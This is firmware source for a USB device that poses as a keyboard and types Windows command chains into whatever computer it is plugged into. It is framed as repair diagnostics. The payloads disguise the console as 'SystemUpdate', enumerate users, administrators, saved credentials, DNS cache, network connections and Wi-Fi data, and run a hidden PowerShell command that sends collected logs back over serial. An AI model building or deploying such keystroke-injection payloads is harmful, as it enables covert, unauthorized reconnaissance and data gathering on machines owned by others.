/**
 * page_logdiag.c — 日志诊断 (Ghost-Audit 集成).
 *
 * 用途: 售后维修场景 — 设备插入目标电脑(Windows), 枚举为 HID 键盘 + CDC 串口,
 *       自动注入 Ghost-Audit 命令链收集 系统/网络/WiFi 信息 + Windows 错误事件日志,
 *       供维修人员判断故障. 日志写入目标电脑桌面 Logs/PC_Audit_Logs 文件夹;
 *       可选经 CDC 串口把关键错误日志回传到设备显示.
 *
 * 模式 (Ghost-Audit 两种 + 增强):
 *   - 快速诊断: 5~8 秒收集基础信息 (系统/网络/WiFi/错误日志)
 *   - 详细诊断: 30~40 秒深度收集 (CPU/RAM/磁盘/服务/进程/USB历史/网络/防火墙/WiFi)
 *   - 串口回传: 注入 PowerShell 把收集的错误日志经 CDC 串口发回设备
 *
 * 字符->HID 映射覆盖完整 ASCII, 支持 Ghost-Audit 命令链全部符号.
 */
#include "os.h"
#include "ui_common.h"
#include "input.h"
#include "usb_hid.h"
#include "font_zh16.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <stdint.h>
#include <string.h>

#define TAG "LOGD"

/* ---- HID 修饰键掩码 ---- */
#define MOD_LCTRL  (1U << 0)
#define MOD_LSHIFT (1U << 1)
#define MOD_LGUI   (1U << 3)

/* ---- HID 键盘码 (标准 usage) ---- */
#define HIDK_A       0x04
#define HIDK_1       0x1E
#define HIDK_2       0x1F
#define HIDK_3       0x20
#define HIDK_4       0x21
#define HIDK_5       0x22
#define HIDK_6       0x23
#define HIDK_7       0x24
#define HIDK_8       0x25
#define HIDK_9       0x26
#define HIDK_0       0x27
#define HIDK_ENTER   0x28
#define HIDK_SPACE   0x2C
#define HIDK_MINUS   0x2D
#define HIDK_EQUAL   0x2E
#define HIDK_LBRACKET 0x2F
#define HIDK_RBRACKET 0x30
#define HIDK_BACKSLASH 0x31
#define HIDK_SEMICOLON 0x33
#define HIDK_QUOTE   0x34
#define HIDK_BACKTICK 0x35
#define HIDK_COMMA   0x36
#define HIDK_PERIOD  0x37
#define HIDK_SLASH   0x38
#define HIDK_R 0x15

/* ---- 字符->HID 映射 (完整 ASCII) ---- */
static void ld_char_hid(char c, uint8_t *mod, uint8_t *key)
{
    *mod = 0; *key = 0;
    if (c >= 'a' && c <= 'z') { *key = (uint8_t)(HIDK_A + (c - 'a')); return; }
    if (c >= 'A' && c <= 'Z') { *key = (uint8_t)(HIDK_A + (c - 'A')); *mod |= MOD_LSHIFT; return; }
    if (c >= '1' && c <= '9') { *key = (uint8_t)(HIDK_1 + (c - '1')); return; }
    if (c == '0')             { *key = HIDK_0; return; }
    switch (c) {
        case ' ':  *key = HIDK_SPACE; return;
        case '!':  *key = HIDK_1;         *mod |= MOD_LSHIFT; return;
        case '@':  *key = HIDK_2;         *mod |= MOD_LSHIFT; return;
        case '#':  *key = HIDK_3;         *mod |= MOD_LSHIFT; return;
        case '$':  *key = HIDK_4;         *mod |= MOD_LSHIFT; return;
        case '%':  *key = HIDK_5;         *mod |= MOD_LSHIFT; return;
        case '^':  *key = HIDK_6;         *mod |= MOD_LSHIFT; return;
        case '&':  *key = HIDK_7;         *mod |= MOD_LSHIFT; return;
        case '*':  *key = HIDK_8;         *mod |= MOD_LSHIFT; return;
        case '(':  *key = HIDK_9;         *mod |= MOD_LSHIFT; return;
        case ')':  *key = HIDK_0;         *mod |= MOD_LSHIFT; return;
        case '_':  *key = HIDK_MINUS;     *mod |= MOD_LSHIFT; return;
        case '+':  *key = HIDK_EQUAL;     *mod |= MOD_LSHIFT; return;
        case '{':  *key = HIDK_LBRACKET;  *mod |= MOD_LSHIFT; return;
        case '}':  *key = HIDK_RBRACKET;  *mod |= MOD_LSHIFT; return;
        case '|':  *key = HIDK_BACKSLASH; *mod |= MOD_LSHIFT; return;
        case ':':  *key = HIDK_SEMICOLON; *mod |= MOD_LSHIFT; return;
        case '"':  *key = HIDK_QUOTE;     *mod |= MOD_LSHIFT; return;
        case '~':  *key = HIDK_BACKTICK;  *mod |= MOD_LSHIFT; return;
        case '<':  *key = HIDK_COMMA;     *mod |= MOD_LSHIFT; return;
        case '>':  *key = HIDK_PERIOD;    *mod |= MOD_LSHIFT; return;
        case '?':  *key = HIDK_SLASH;     *mod |= MOD_LSHIFT; return;
        case '-':  *key = HIDK_MINUS;     return;
        case '=':  *key = HIDK_EQUAL;     return;
        case '[':  *key = HIDK_LBRACKET;  return;
        case ']':  *key = HIDK_RBRACKET;  return;
        case '\\': *key = HIDK_BACKSLASH; return;
        case ';':  *key = HIDK_SEMICOLON; return;
        case '\'': *key = HIDK_QUOTE;     return;
        case '`':  *key = HIDK_BACKTICK;  return;
        case ',':  *key = HIDK_COMMA;     return;
        case '.':  *key = HIDK_PERIOD;    return;
        case '/':  *key = HIDK_SLASH;     return;
        default:   *key = 0; return;
    }
}

/* 逐字符发送字符串 */
static void ld_send_str(const char *s)
{
    for (; *s; s++) {
        uint8_t mod, key;
        ld_char_hid(*s, &mod, &key);
        if (key == 0) continue;
        usb_hid_key_tap(mod, key);
        vTaskDelay(pdMS_TO_TICKS(8));
    }
}

/* Win+R 打开运行框并执行命令 */
static void ld_win_cmd(const char *cmd)
{
    usb_hid_key_tap(MOD_LGUI, HIDK_R);
    vTaskDelay(pdMS_TO_TICKS(350));
    ld_send_str(cmd);
    vTaskDelay(pdMS_TO_TICKS(120));
    usb_hid_key_tap(0, HIDK_ENTER);
}

/* 在当前活动窗口输入一行命令并回车 */
static void ld_send_line(const char *line)
{
    ld_send_str(line);
    vTaskDelay(pdMS_TO_TICKS(80));
    usb_hid_key_tap(0, HIDK_ENTER);
}

/* ---- Ghost-Audit 命令链 (C 数组) ----
 * 首步 = Win+R 打开 cmd; 后续 = cmd 窗口逐条执行.
 * 日志写入目标电脑桌面 %USERPROFILE%\Desktop\<文件夹>. */

/* 快速诊断 (Stealth Mode): 5~8 秒 */
static const char *const s_stealth[] = {
    "cmd /k \"mode con: cols=20 lines=1 & color 08 & title SystemUpdate\"",
    "md \"%USERPROFILE%\\Desktop\\Logs\\Sys\" & md \"%USERPROFILE%\\Desktop\\Logs\\Net\" & md \"%USERPROFILE%\\Desktop\\Logs\\Wifi\"",
    "wmic logicaldisk get caption,size,freespace > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Disk.txt\" & wmic memorychip get capacity,speed > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\RAM.txt\" & wmic cpu get name > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\CPU.txt\" & net user > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Users.txt\" & net localgroup administrators > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Admins.txt\" & reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr DisplayName > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Software.txt\"",
    "wmic os get Caption,CSDVersion,OSArchitecture,Version > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\OS_Info.txt\" & reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s | findstr FriendlyName > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\USB.txt\" & cmdkey /list > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\Creds.txt\"",
    "ipconfig /all > \"%USERPROFILE%\\Desktop\\Logs\\Net\\IP.txt\" & ipconfig /displaydns > \"%USERPROFILE%\\Desktop\\Logs\\Net\\DNS.txt\" & arp -a > \"%USERPROFILE%\\Desktop\\Logs\\Net\\ARP.txt\" & route print > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Route.txt\" & netstat -ano > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Ports.txt\" & type C:\\Windows\\System32\\drivers\\etc\\hosts > \"%USERPROFILE%\\Desktop\\Logs\\Net\\Hosts.txt\"",
    "netsh wlan show all > \"%USERPROFILE%\\Desktop\\Logs\\Wifi\\Report.txt\"",
    "wevtutil qe System /q:*[System[(Level=2)]] /f:txt /c:50 > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\SystemErrors.txt\"",
    "wevtutil qe Application /q:*[System[(Level=2)]] /f:txt /c:50 > \"%USERPROFILE%\\Desktop\\Logs\\Sys\\AppErrors.txt\"",
    "exit",
};
#define STEALTH_N (int)(sizeof(s_stealth)/sizeof(s_stealth[0]))

/* 详细诊断 (Detailed Mode): 30~40 秒 */
static const char *const s_detailed[] = {
    "cmd",
    "md \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\"",
    "md \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\"",
    "md \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\"",
    "md \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\3_WiFi\"",
    "wmic logicaldisk get caption,description,filesystem,size,freespace > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Disk_Info.txt\"",
    "wmic memorychip get capacity,speed,manufacturer > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\RAM_Info.txt\"",
    "wmic cpu get name,numberofcores > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\CPU_Info.txt\"",
    "net user > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Users.txt\"",
    "net localgroup administrators > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Admins.txt\"",
    "cmdkey /list > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Saved_Credentials_List.txt\"",
    "tasklist /v > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Running_Processes.txt\"",
    "wmic startup get caption,command > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Startup_Apps.txt\"",
    "wmic service get name,displayname,state,startmode > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\All_Services.txt\"",
    "set > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Env_Variables.txt\"",
    "reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s | findstr FriendlyName > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\USB_History.txt\"",
    "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr DisplayName > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Installed_Software.txt\"",
    "systeminfo > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Full_OS_Info.txt\"",
    "wevtutil qe System /q:*[System[(Level=2)]] /f:txt /c:100 > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\System_Errors.txt\"",
    "wevtutil qe Application /q:*[System[(Level=2)]] /f:txt /c:100 > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\1_System\\Application_Errors.txt\"",
    "ipconfig /all > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\\IP_Config.txt\"",
    "ipconfig /displaydns > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\\DNS_History.txt\"",
    "arp -a > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\\ARP_Table.txt\"",
    "route print > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\\Route_Table.txt\"",
    "netstat -ano > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\\Active_Connections.txt\"",
    "net share > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\\Network_Shares.txt\"",
    "netsh advfirewall show allprofiles > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\\Firewall_State.txt\"",
    "type C:\\Windows\\System32\\drivers\\etc\\hosts > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\2_Network\\Hosts_File.txt\"",
    "netsh wlan show networks mode=bssid > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\3_WiFi\\Nearby_Networks_Scan.txt\"",
    "netsh wlan show all > \"%USERPROFILE%\\Desktop\\PC_Audit_Logs\\3_WiFi\\Full_Report.txt\"",
    "exit",
};
#define DETAILED_N (int)(sizeof(s_detailed)/sizeof(s_detailed[0]))

/* 串口回传: 注入 PowerShell 把收集的错误日志经 CDC 串口发回设备 */
static const char *const s_backhaul[] = {
    "cmd",
    "powershell -nop -w hidden -c \"$p=[IO.Ports.SerialPort]::GetPortNames();foreach($x in $p){try{$s=New-Object IO.Ports.SerialPort($x,115200);$s.Open();$f=$env:USERPROFILE+'\\Desktop\\Logs\\Sys\\SystemErrors.txt';if(Test-Path $f){$s.Write([IO.File]::ReadAllText($f))};$s.Close()}catch{}}\"",
    "exit",
};
#define BACKHAUL_N (int)(sizeof(s_backhaul)/sizeof(s_backhaul[0]))

/* ---- 注入任务 ---- */
static TaskHandle_t s_inj_task = NULL;
static volatile int s_inj_state = 0;    /* 0=空闲 1=注入中 2=完成 */
static volatile int s_inj_prog = 0;     /* 当前命令序号 */
static volatile int s_inj_total = 0;

static const uint16_t s_stealth_delay[] = { 600, 300, 1200, 800, 1000, 800, 1200, 1200, 0 };
static const uint16_t s_detailed_delay[] = { 500, 200, 200, 200, 200, 300, 300, 300, 200, 200, 300, 300, 300, 400, 300, 500, 800, 800, 800, 300, 300, 300, 300, 300, 300, 300, 300, 500, 500, 0 };
static const uint16_t s_backhaul_delay[] = { 500, 2000, 0 };

static void ld_inject_run(const char *const *cmds, int n, const uint16_t *delay)
{
    for (int i = 0; i < n; i++) {
        s_inj_prog = i;
        if (i == 0) ld_win_cmd(cmds[i]);
        else        ld_send_line(cmds[i]);
        if (delay[i] > 0) vTaskDelay(pdMS_TO_TICKS(delay[i]));
        if (s_inj_task == NULL) break;
    }
    s_inj_prog = n;
    s_inj_state = 2;
    vTaskDelete(NULL);
}

static void ld_inject_task(void *arg)
{
    int mode = (int)(intptr_t)arg;
    if (mode == 0)      { s_inj_total = STEALTH_N;  ld_inject_run(s_stealth,  STEALTH_N,  s_stealth_delay); }
    else if (mode == 1) { s_inj_total = DETAILED_N; ld_inject_run(s_detailed, DETAILED_N, s_detailed_delay); }
    else                { s_inj_total = BACKHAUL_N; ld_inject_run(s_backhaul, BACKHAUL_N, s_backhaul_delay); }
    s_inj_task = NULL;
}

static void ld_start_inject(int mode)
{
    if (s_inj_task) return;
    if (!usb_hid_is_running()) return;
    s_inj_state = 1; s_inj_prog = 0;
    xTaskCreate(ld_inject_task, "ldi", 4096, (void *)(intptr_t)mode, 2, &s_inj_task);
}

/* ---- UI ---- */
#define LD_BTN_H   36
#define LD_BTN_Y0  58
#define LD_BTN_GAP 6
#define LD_BTN_X   20
#define LD_BTN_W   (400 - LD_BTN_X * 2)

static void ld_label(st7305_handle_t *l, int x, int y, const char *s, bool inv)
{
    int n = (int)(strlen(s) / 3);
    st7305_color_t bg = inv ? ST7305_COLOR_BLACK : ST7305_COLOR_WHITE;
    st7305_color_t fg = inv ? ST7305_COLOR_WHITE : ST7305_COLOR_BLACK;
    for (int i = 0; i < n; i++) {
        int idx = font_zh16_find_utf8(s + i * 3);
        if (idx < 0) continue;
        const uint8_t *bmp = zh16_font_data[idx];
        for (int r = 0; r < 16; r++)
            for (int c = 0; c < 16; c++) {
                int byte = bmp[r * 2 + (c / 8)];
                st7305_draw_pixel(l, x + i * 16 + c, y + r, (byte & (1 << (7 - (c % 8)))) ? fg : bg);
            }
    }
}

static void ld_ascii_center(st7305_handle_t *l, int cx, int y, const char *s)
{
    int w = (int)strlen(s) * 8;
    int x = cx - w / 2;
    for (int i = 0; s[i]; i++) draw_ascii_small(l, x + i * 8, y, s[i], false);
}

static void ld_render(ui_ctx_t *ctx)
{
    st7305_handle_t *l = ctx->lcd;
    if (!l) return;
    st7305_clear(l, ST7305_COLOR_WHITE);

    ld_label(l, 12, 12, "\xe6\x97\xa5\xe5\xbf\x97\xe8\xaf\x8a\xe6\x96\xad", false); /* 日志诊断 */
    draw_hline(l, 0, 399, 38, ST7305_COLOR_BLACK);

    bool conn = usb_hid_cdc_connected();
    ld_ascii_center(l, 200, 42, conn ? "USB : CONNECTED" : "USB : DISCONNECT");

    const char *btns[3] = {
        "\xe5\xbf\xab\xe9\x80\x9f\xe8\xaf\x8a\xe6\x96\xad",       /* 快速诊断 */
        "\xe8\xaf\xa6\xe7\xbb\x86\xe8\xaf\x8a\xe6\x96\xad",       /* 详细诊断 */
        "\xe4\xb8\xb2\xe5\x8f\xa3\xe5\x9b\x9e\xe4\xbc\xa0",       /* 串口回传 */
    };
    for (int i = 0; i < 3; i++) {
        int y0 = LD_BTN_Y0 + i * (LD_BTN_H + LD_BTN_GAP);
        int y1 = y0 + LD_BTN_H - 1;
        draw_rect_outline(l, LD_BTN_X, y0, LD_BTN_X + LD_BTN_W - 1, y1, ST7305_COLOR_BLACK);
        ld_label(l, LD_BTN_X + (LD_BTN_W - (int)strlen(btns[i]) / 3 * 16) / 2,
                 y0 + (LD_BTN_H - 16) / 2, btns[i], false);
    }

    if (s_inj_state == 1) {
        ld_ascii_center(l, 200, 218, s_inj_prog == 0 ? "RUN CMD ..." : "INJECTING ...");
        int w = 300, x0 = 50;
        if (s_inj_total > 0) {
            int fw = (s_inj_prog * w) / s_inj_total;
            for (int x = x0; x < x0 + w; x++) {
                st7305_draw_pixel(l, x, 232, ST7305_COLOR_BLACK);
                if (x < x0 + fw) st7305_draw_pixel(l, x, 231, ST7305_COLOR_BLACK);
            }
        }
    } else if (s_inj_state == 2) {
        ld_ascii_center(l, 200, 218, "DONE. LOGS ON DESKTOP");
    } else {
        ld_ascii_center(l, 200, 218, "PLUG USB TO PC, OPEN CDC PORT");
    }

    ld_label(l, 24, 248, "\xe6\x93\x8d\xe4\xbd\x9c\xef\xbc\x9a\xe6\x8f\x92\xe5\x85\xa5\xe7\x9b\xae\xe6\xa0\x87\xe7\x94\xb5\xe8\x84\x91", false); /* 操作：插入目标电脑 */
    ld_label(l, 24, 268, "\xe9\x80\x89\xe6\x8b\xa9\xe6\xa8\xa1\xe5\xbc\x8f\xe6\xb3\xa8\xe5\x85\xa5\xe6\x97\xa5\xe5\xbf\x97\xe8\x87\xaa\xe5\x8a\xa8\xe7\x94\x9f\xe6\x88\x90", false); /* 选择模式注入日志自动生成 */
    ld_ascii_center(l, 200, 290, "BACK = EXIT");
}

static bool ld_touch(ui_ctx_t *ctx, int x, int y)
{
    for (int i = 0; i < 3; i++) {
        int y0 = LD_BTN_Y0 + i * (LD_BTN_H + LD_BTN_GAP);
        if (y >= y0 && y < y0 + LD_BTN_H) {
            if (s_inj_state == 1) return true;
            ld_start_inject(i);
            ctx->needs_redraw = true;
            return true;
        }
    }
    return false;
}

static void ld_poll(ui_ctx_t *ctx)
{
    (void)ctx;
    /* 读取目标电脑经 CDC 发回的日志 */
    static uint8_t s_cdc_buf[256];
    static uint32_t s_last_ts = 0;
    size_t n = usb_hid_cdc_read(s_cdc_buf, sizeof(s_cdc_buf) - 1);
    if (n > 0) {
        uint32_t now = (uint32_t)(xTaskGetTickCount() * portTICK_PERIOD_MS);
        if (now - s_last_ts > 500) {
            s_last_ts = now;
            ESP_LOGI(TAG, "CDC 回传收到 %u 字节: %.*s", (unsigned)n, (n > 64 ? 64 : (int)n), (const char *)s_cdc_buf);
        }
    }
}

static void ld_action(ui_ctx_t *ctx, os_action_t action)
{
    if (action == OS_ACTION_BACK || action == OS_ACTION_HOME) {
        if (s_inj_task) { vTaskDelete(s_inj_task); s_inj_task = NULL; s_inj_state = 0; }
        usb_hid_key_release();
        usb_hid_stop();
        os_pop(ctx);
    }
}

static void ld_enter(ui_ctx_t *ctx)
{
    esp_err_t ret = usb_hid_start();
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "日志诊断 USB 启动失败: %s", esp_err_to_name(ret));
        os_pop(ctx);
        return;
    }
    s_inj_state = 0; s_inj_prog = 0; s_inj_total = 0;
}

static void ld_exit(ui_ctx_t *ctx)
{
    (void)ctx;
    if (s_inj_task) { vTaskDelete(s_inj_task); s_inj_task = NULL; s_inj_state = 0; }
    usb_hid_key_release();
    usb_hid_stop();
}

static const os_module_t s_mod_logdiag = {
    .name = "logdiag", .page_id = OS_PAGE_LOGDIAO,
    .on_enter = ld_enter, .on_exit = ld_exit,
    .render = ld_render, .action = ld_action, .touch = ld_touch, .poll = ld_poll,
    .fullscreen = true,
};
void os_page_logdiag_register(void) { os_register(&s_mod_logdiag); }
